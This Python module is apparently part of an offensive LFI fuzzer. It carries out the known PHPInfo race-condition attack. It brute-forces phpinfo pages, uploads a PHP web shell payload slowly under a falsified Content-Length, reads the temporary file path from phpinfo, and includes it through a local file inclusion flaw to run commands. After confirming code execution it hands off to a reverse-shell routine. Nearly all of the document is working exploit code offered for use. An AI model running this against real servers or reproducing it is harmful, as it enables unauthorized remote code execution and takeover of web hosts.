#!/usr/bin/env python3
"""
Mode 3: PHPInfo Race Condition RCE
Requires: file_uploads=On, accessible phpinfo(), LFI
Author: RevShellXD
"""

import re
import time
import threading
import secrets
import urllib.parse
from urllib.parse import quote_plus

# ---------- OS-SPECIFIC PHPINFO WORDLISTS ----------
LINUX_PHPINFO_PATHS = [
    'phpinfo.php', 'info.php', 'test.php', 'i.php', 'p.php', 'php.php',
    'info1.php', 'php_info.php', 'phpinfo1.php', 'phpinfo.php.bak',
    'phpinfo.php.old', 'phpinfo.php~', 'phpinfo.php.swp', 'info.php.bak',
    'admin/phpinfo.php', 'includes/phpinfo.php', 'public/phpinfo.php',
    'static/phpinfo.php', 'assets/phpinfo.php', 'files/phpinfo.php',
    'uploads/phpinfo.php', 'xampp/phpinfo.php', 'lampp/phpinfo.php',
    'opt/lampp/htdocs/phpinfo.php', 'phpmyadmin/phpinfo.php',
    'pma/phpinfo.php', 'admin/phpmyadmin/phpinfo.php', 'wp-admin/phpinfo.php',
    'wp-content/phpinfo.php', 'wp-includes/phpinfo.php', 'administrator/phpinfo.php',
    'sites/default/phpinfo.php', 'public/phpinfo.php', 'web/phpinfo.php',
    'apache/phpinfo.php', 'apache2/phpinfo.php', 'httpd/phpinfo.php',
    'cgi-bin/phpinfo.php', 'cgi-bin/php',
]

WINDOWS_PHPINFO_PATHS = [
    'phpinfo.php', 'info.php', 'test.php', 'i.php', 'p.php', 'php.php',
    'info1.php', 'php_info.php', 'phpinfo1.php', 'phpinfo.php.bak',
    'phpinfo.php.old', 'phpinfo.php~', 'info.php.bak',
    'xampp/phpinfo.php', 'xampp/php/phpinfo.php', 'xampp/htdocs/phpinfo.php',
    'xampp/apache/phpinfo.php', 'wamp/phpinfo.php', 'wamp64/phpinfo.php',
    'www/phpinfo.php', 'wamp/www/phpinfo.php', 'iisstart.php',
    'iis-85/phpinfo.php', 'inetpub/wwwroot/phpinfo.php', 'www/phpinfo.php',
    'htdocs/phpinfo.php', 'html/phpinfo.php', 'public/phpinfo.php',
    'phpmyadmin/phpinfo.php', 'pma/phpinfo.php', 'admin/phpmyadmin/phpinfo.php',
    'Program Files/PHP/phpinfo.php',
]

# ---------- HELPER: PARSE PHP SIZE STRINGS ----------
def _parse_size_to_bytes(size_str):
    size_str = size_str.strip().upper()
    if size_str.endswith('G'):
        return int(float(size_str[:-1]) * 1024**3)
    elif size_str.endswith('M'):
        return int(float(size_str[:-1]) * 1024**2)
    elif size_str.endswith('K'):
        return int(float(size_str[:-1]) * 1024)
    else:
        return int(size_str)

# ---------- PHASE 1: BRUTEFORCE PHPINFO ----------
def bruteforce_phpinfo(config, fuzzer):
    """Scan for phpinfo.php using OS-specific wordlist."""
    parsed = urllib.parse.urlparse(config['base_url'])
    root_url = f"{parsed.scheme}://{parsed.netloc}/"
    
    wordlist = LINUX_PHPINFO_PATHS if fuzzer.config['os_type'] == 'linux' else WINDOWS_PHPINFO_PATHS
    fuzzer._print(f"[*] Bruteforcing phpinfo.php ({len(wordlist)} paths) ...", 'info')
    
    for path in wordlist:
        url = root_url + path
        if config['verbose']:
            fuzzer._print(f"[DEBUG] Trying {url}", 'debug')
        status, content = fuzzer.send_http_request(
            parsed.scheme, parsed.hostname, parsed.port or 80, '/' + path,
            verbose=config['verbose']
        )
        if status == 200 and 'PHP Version' in content and '<title>phpinfo()' in content:
            fuzzer._print(f"[+] Found phpinfo.php at {url}", 'success')
            return url, content
    return None, None

# ---------- PHASE 2: PARSE PHPINFO ----------
def parse_phpinfo_for_upload(html, fuzzer):
    """Extract upload_max_filesize, post_max_size, document_root."""
    upload_match = re.search(r'upload_max_filesize.*?class="v">(\d+)([KMG])?<', html, re.IGNORECASE)
    post_match = re.search(r'post_max_size.*?class="v">(\d+)([KMG])?<', html, re.IGNORECASE)
    doc_root_match = re.search(r'DOCUMENT_ROOT.*?class="v">(.+?)<', html, re.IGNORECASE)
    
    upload_bytes = 0
    post_bytes = 0
    doc_root = None
    
    if upload_match:
        upload_bytes = _parse_size_to_bytes(upload_match.group(1) + (upload_match.group(2) or ''))
    if post_match:
        post_bytes = _parse_size_to_bytes(post_match.group(1) + (post_match.group(2) or ''))
    if doc_root_match:
        doc_root = doc_root_match.group(1).strip()
    
    exploitable = (upload_match is not None and post_match is not None and post_bytes >= upload_bytes)
    return exploitable, upload_bytes, post_bytes, doc_root

# ---------- PAYLOAD GENERATION ----------
def _generate_test_payload(fuzzer):
    token = "LFI_" + secrets.token_hex(8)
    return f"<?php echo '{token}'; system($_GET['cmd']); ?>"

# ---------- EXTRACT TMP_NAME FROM LIVE PHPINFO ----------
def _extract_tmp_name_from_phpinfo(html, fuzzer):
    if fuzzer.config['os_type'] == 'linux':
        pattern = r'tmp_name.*?<td[^>]*>(/tmp/php\w+)</td>'
    else:
        pattern = r'tmp_name.*?<td[^>]*>([A-Z]:\\Windows\\Temp\\php\w+\.tmp)</td>'
    match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
    if match:
        path = match.group(1)
        if fuzzer.config['os_type'] == 'windows':
            path = path.replace('\\', '/')
        return path
    return None

# ---------- INCLUDE AND TEST LFI ----------
def _include_and_test(lfi_config, tmp_path, test_cmd, fuzzer):
    lfi_payload = lfi_config['traversal_prefix'] + tmp_path.lstrip('/')
    encoded = fuzzer.encode_payload(lfi_payload, lfi_config['encoding'], lfi_config['user_encoding'])
    
    if lfi_config['lfi_type'] == 'path':
        test_url = lfi_config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        test_url += f"?cmd={quote_plus(test_cmd)}"
    else:
        base = fuzzer._inject_lfi_payload(encoded, lfi_config['base_url'], lfi_config['param_name'])
        if '?' in base:
            test_url = base + f"&cmd={quote_plus(test_cmd)}"
        else:
            test_url = base + f"?cmd={quote_plus(test_cmd)}"
    
    status, content = fuzzer.send_http_request(
        lfi_config['protocol'], lfi_config['host'], lfi_config['port'],
        test_url, verbose=lfi_config['verbose']
    )
    if status == 200 and content and ('uid=' in content or test_cmd in content):
        fuzzer._print("[+] RCE confirmed via temporary file!", 'success')
        return True
    return False

# ---------- RACE CONDITION ATTACK ----------
def race_condition_attack(lfi_config, phpinfo_url, phpinfo_content, fuzzer, max_attempts=3):
    fuzzer._print("[*] Starting race condition attack (upload + LFI) ...", 'info')
    
    parsed = urllib.parse.urlparse(phpinfo_url)
    post_target = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    test_payload = _generate_test_payload(fuzzer)
    boundary = "----WebKitFormBoundary" + secrets.token_hex(16)
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
        f"Content-Type: application/x-php\r\n\r\n"
        f"{test_payload}\r\n"
        f"--{boundary}--\r\n"
    )
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Content-Length': str(len(body) + 10000),  # Lie to keep connection open
    }
    
    result = {"tmp_path": None, "success": False, "attempts": 0}
    
    def slow_upload_worker():
        try:
            conn = fuzzer._create_connection(parsed.scheme, parsed.hostname, parsed.port or 80)
            conn.putrequest("POST", parsed.path)
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            for i in range(0, len(body), 512):
                conn.send(body[i:i+512])
                time.sleep(0.2)
            time.sleep(1)
            conn.getresponse()
            conn.close()
        except Exception as e:
            if lfi_config['verbose']:
                fuzzer._print(f"[DEBUG] Upload worker error: {e}", 'debug')
    
    for attempt in range(1, max_attempts + 1):
        fuzzer._print(f"[*] Race attempt {attempt}/{max_attempts} ...", 'info')
        result["attempts"] = attempt
        
        t1 = threading.Thread(target=slow_upload_worker)
        t1.daemon = True
        t1.start()
        time.sleep(0.3)
        
        status, php_html = fuzzer.send_http_request(
            parsed.scheme, parsed.hostname, parsed.port or 80,
            parsed.path, verbose=lfi_config['verbose']
        )
        if status == 200:
            tmp_path = _extract_tmp_name_from_phpinfo(php_html, fuzzer)
            if tmp_path:
                fuzzer._print(f"[+] Extracted temporary file path: {tmp_path}", 'success')
                result["tmp_path"] = tmp_path
                test_cmd = "id" if fuzzer.config['os_type'] == 'linux' else "whoami"
                if _include_and_test(lfi_config, tmp_path, test_cmd, fuzzer):
                    result["success"] = True
                    break
                else:
                    fuzzer._print("[-] LFI inclusion succeeded but test command failed. Retrying...", 'warning')
        t1.join(timeout=1)
        time.sleep(0.5)
    return result

# ---------- MAIN ENTRY POINT ----------
def run(config, fuzzer):
    """
    config: target configuration dict (from main script)
    fuzzer: instance of LFI_SSH_Fuzzer (provides all methods)
    """
    # Phase 1: Bruteforce phpinfo
    phpinfo_url, phpinfo_content = bruteforce_phpinfo(config, fuzzer)
    if not phpinfo_url:
        fuzzer._print("[-] No phpinfo.php found. Cannot proceed.", 'error')
        return
    
    # Phase 2: Parse for upload capability
    exploitable, upload_bytes, post_bytes, doc_root = parse_phpinfo_for_upload(phpinfo_content, fuzzer)
    if not exploitable:
        fuzzer._print("[-] file_uploads=Off or misconfigured (post_max_size < upload_max_filesize).", 'error')
        return
    
    fuzzer._print(f"[+] file_uploads=On (max size: {upload_bytes} bytes)", 'success')
    fuzzer._print(f"[+] post_max_size: {post_bytes} bytes", 'info')
    if doc_root:
        fuzzer._print(f"[+] DOCUMENT_ROOT: {doc_root}", 'info')
    
    # Phase 3: Race condition
    choice = input("\nAttempt race condition RCE via file upload? (y/N): ").strip().lower()
    if choice == 'y':
        result = race_condition_attack(config, phpinfo_url, phpinfo_content, fuzzer, max_attempts=3)
        if result['success']:
            fuzzer._print("[+] RCE achieved! Proceeding to reverse shell...", 'success')
            fuzzer._attempt_reverse_shell(config, result['tmp_path'])
        else:
            fuzzer._print(f"[-] Race condition failed after {result['attempts']} attempts.", 'error')
            if doc_root:
                fuzzer._print("[*] Attempting fallback with DOCUMENT_ROOT...", 'info')
                # Simple fallback: append doc_root to traversal prefix (assume absolute path works)
                config['traversal_prefix'] = '../' * config['traversal_depth']
                # Retry with adjusted depth (user may need to manually adjust)
                result = race_condition_attack(config, phpinfo_url, phpinfo_content, fuzzer, max_attempts=2)
                if result['success']:
                    fuzzer._attempt_reverse_shell(config, result['tmp_path'])
                else:
                    fuzzer._print("[-] Fallback also failed.", 'error')
